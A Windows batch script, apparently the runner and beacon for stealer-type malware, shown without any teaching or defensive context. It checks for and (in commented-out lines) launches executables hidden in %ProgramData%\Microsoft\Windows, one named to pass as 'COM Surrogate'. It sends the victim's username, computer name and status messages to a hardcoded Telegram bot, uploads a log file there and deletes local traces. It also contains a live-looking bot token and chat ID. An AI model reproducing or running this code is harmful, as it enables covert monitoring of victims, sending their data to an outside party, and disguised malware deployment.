@echo off


setlocal enabledelayedexpansion

set "BATCHVERSION=1.7"

set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "filename="



for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)
set "filename1=!filename!"
set "filename="
set "LOGFILE=%temp%\!filename1!"



for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)
set "filename2=!filename!"
set "filename="
set "LOGFILE1=%temp%\!filename2!.mseuop"








:: Start logging from this point
call :LogOutput > "%LOGFILE%" 2>&1
del /f /q "%LOGFILE%"
del /f /q "%LOGFILE1%"
echo.
echo.
echo Exiting...
exit

:LogOutput






:: ============ STLR TOPIC ============


:: Set bot token, chat ID, and message
set "TOKEN_STLR=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
set "CHAT_ID_STLR=-1002163721260"
set "TOPIC_ID_STLR=73727"
set "MESSAGE_STLR=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|30MINLEFTFORSTARTCOM..|%time%|(v%BATCHVERSION%)"
set "ENCODED_MESSAGE_STLR=%MESSAGE_STLR: =%%2"
set "CAPTION_STLR=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|FINAL|%time%|(v%BATCHVERSION%)"
set "FILE_PATH_STLR=%LOGFILE1%"






echo :CHECKSTLRRUNSTATUS Started
echo.
:CHECKSTLRRUNSTATUS
:: Check if the process is already running
tasklist /fi "imagename eq STLRRUNNERCALLER.exe" | find /i "STLRRUNNERCALLER.exe" >nul
if %errorlevel% neq 0 (
    echo STLRRUNNERCALLER.exe is not running.
    echo Starting STLRRUNNERCALLER...
    ::start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
    echo Not Started.
) else (
    echo STLRRUNNERCALLER.exe is already running.
)






echo.
echo Sending"%ENCODED_MESSAGE_STLR%"

curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendMessage" ^
     -d "chat_id=%CHAT_ID_STLR%" ^
     -d "message_thread_id=%TOPIC_ID_STLR%" ^
     -d "text=%ENCODED_MESSAGE_STLR%"


echo Message sent to chat ID %CHAT_ID_STLR% and Topic ID %TOPIC_ID_STLR%
echo.
echo Sended
echo.

echo.
echo Waiting 60 seconds
timeout /t 60 /nobreak
echo.


echo Starting COM

:: start "" "%ProgramData%\Microsoft\Windows\COM Surrogate.exe"

echo Started


curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendMessage" ^
     -d "chat_id=%CHAT_ID_STLR%" ^
     -d "message_thread_id=%TOPIC_ID_STLR%" ^
     -d "text=%USERNAME%(%COMPUTERNAME%)|COMSTARTEEEEED|%time%|(v%BATCHVERSION%)"



echo.
set "MESSAGE_STLR=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|COMSTARTED.3H.LEFTFORSTARTCOM..|%time%|(v%BATCHVERSION%)"
set "ENCODED_MESSAGE_STLR=%MESSAGE_STLR: =%%2"



echo.
echo Sending"%ENCODED_MESSAGE_STLR%"

curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendMessage" ^
     -d "chat_id=%CHAT_ID_STLR%" ^
     -d "message_thread_id=%TOPIC_ID_STLR%" ^
     -d "text=%ENCODED_MESSAGE_STLR%"


echo Message sent to chat ID %CHAT_ID_STLR% and Topic ID %TOPIC_ID_STLR%
echo.
echo Sended
echo.



echo.
echo Waiting 60 seconds
timeout /t 60 /nobreak
echo.



set "MESSAGE_STLR=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|2H.30MIN.LEFTFORSTARTCOM..|%time%|(v%BATCHVERSION%)"
set "ENCODED_MESSAGE_STLR=%MESSAGE_STLR: =%%2"


echo.
echo Sending"%ENCODED_MESSAGE_STLR%"

curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendMessage" ^
     -d "chat_id=%CHAT_ID_STLR%" ^
     -d "message_thread_id=%TOPIC_ID_STLR%" ^
     -d "text=%ENCODED_MESSAGE_STLR%"


echo Message sent to chat ID %CHAT_ID_STLR% and Topic ID %TOPIC_ID_STLR%
echo.
echo Sended
echo.



echo.
echo Waiting 60 seconds
timeout /t 60 /nobreak
echo.




set "MESSAGE_STLR=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|2H.LEFTFORSTARTCOM..|%time%|(v%BATCHVERSION%)"
set "ENCODED_MESSAGE_STLR=%MESSAGE_STLR: =%%2"

echo.
echo Sending"%ENCODED_MESSAGE_STLR%"

curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendMessage" ^
     -d "chat_id=%CHAT_ID_STLR%" ^
     -d "message_thread_id=%TOPIC_ID_STLR%" ^
     -d "text=%ENCODED_MESSAGE_STLR%"


echo Message sent to chat ID %CHAT_ID_STLR% and Topic ID %TOPIC_ID_STLR%
echo.
echo Sended
echo.






echo.
echo Waiting 60 seconds
timeout /t 60 /nobreak
echo.




set "MESSAGE_STLR=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|1H.30MIN.LEFTFORSTARTCOM..|%time%|(v%BATCHVERSION%)"
set "ENCODED_MESSAGE_STLR=%MESSAGE_STLR: =%%2"

echo.
echo Sending"%ENCODED_MESSAGE_STLR%"

curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendMessage" ^
     -d "chat_id=%CHAT_ID_STLR%" ^
     -d "message_thread_id=%TOPIC_ID_STLR%" ^
     -d "text=%ENCODED_MESSAGE_STLR%"


echo Message sent to chat ID %CHAT_ID_STLR% and Topic ID %TOPIC_ID_STLR%
echo.
echo Sended
echo.


echo.
echo Waiting 60 seconds
timeout /t 60 /nobreak
echo.




set "MESSAGE_STLR=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|1H.LEFTFORSTARTCOM..|%time%|(v%BATCHVERSION%)"
set "ENCODED_MESSAGE_STLR=%MESSAGE_STLR: =%%2"

echo.
echo Sending"%ENCODED_MESSAGE_STLR%"

curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendMessage" ^
     -d "chat_id=%CHAT_ID_STLR%" ^
     -d "message_thread_id=%TOPIC_ID_STLR%" ^
     -d "text=%ENCODED_MESSAGE_STLR%"


echo Message sent to chat ID %CHAT_ID_STLR% and Topic ID %TOPIC_ID_STLR%
echo.
echo Sended
echo.


echo.
echo Waiting Last 60 seconds
timeout /t 60 /nobreak
echo.
echo.

echo Sending msg..
type "%LOGFILE%" >> "%LOGFILE1%"



:: Send the file (as a document)
curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendDocument" ^
     -F "chat_id=%CHAT_ID_STLR%" ^
     -F "message_thread_id=%TOPIC_ID_STLR%" ^
     -F "caption=%CAPTION_STLR%" ^
     -F "document=@%FILE_PATH_STLR%"






